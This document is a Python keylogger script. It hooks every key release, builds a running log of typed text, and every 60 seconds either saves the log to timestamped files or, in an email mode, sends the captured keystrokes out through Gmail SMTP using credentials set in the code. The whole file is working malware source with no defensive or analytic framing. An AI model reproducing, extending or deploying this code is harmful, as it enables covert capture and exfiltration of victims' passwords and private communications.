import keyboard
import smtplib
from threading import Timer
from datetime import datetime


report_timer = 60 #report every how many seconds 
email = "email" #your email
password = "password" #your password


class keylogger:
	def __init__(self,interval,report_method="email"): #initialize the variables
		self.interval = interval 
		self.method = report_method

		self.log=""

		self.start_t = datetime.now()
		self.end_t = datetime.now()


	def callback(self,event): #on key_release
		name = event.name

		if len(name)>1:
			if name == "space": #space bar
				name = " "

			elif name == "enter": #enter to go to new line
				name = "[ENTER]\n"

			elif name == "decimal": #decimal
				name = "."

			elif keyboard.is_pressed("shift") and name == "1": #shift
				name = "!"

			else:
				name = name.replace(" ","_")
				name = f"[{name.upper()}]" #making name upper case

		self.log += name #add to global variable


	def update_filename(self): #rename the filename every 60 seconds to get a new file
		start_dt = str(self.start_t)[:-7].replace(" ","-").replace(":","")
		end_dt = str(self.end_t)[:-7].replace(" ","-").replace(":","")
		self.filename = f" keylog - {start_dt} _ {end_dt}"
		print(f"[+] Saved {self.filename}.txt") #output on console

	def report_to_file(self): #make a new filename in the directory
		with open(f"{self.filename}.txt","w") as f:
			print(self.log,file=f)

		print(f"[+] Saved {self.filename}.txt") #output on console


	def send_mail(self,email,password,message): #send the mail 
		server = smtplib.SMTP(host="smtp.gmail.com",port="587")
		server.starttls() #starting server

		server.login(email,password)
		server.sendmail(email,email,message) #from your mail to yourself 

		server.quit() #terminating server


	def report(self): #sends keylog and resets self.log
		if self.log:
			self.end_t = datetime.now()
			self.update_filename()

			if self.method == "email":
				self.send_mail(email,password,self.log)

			elif self.method == "file":
				self.report_to_file()

			self.start_t = datetime.now()

		self.log = ""

		timer = Timer (interval = self.interval,function=self.report) #run report every self.interval time
		timer.daemon = True

		timer.start()

	def start(self):
		self.start_t = datetime.now()
		keyboard.on_release(callback=self.callback)
		self.report()
		keyboard.wait()


if __name__ == "__main__":
	# keylog = keylogger(interval=report_timer,report_method="email")
	keylog = keylogger(interval=report_timer,report_method="file")
	keylog.start()





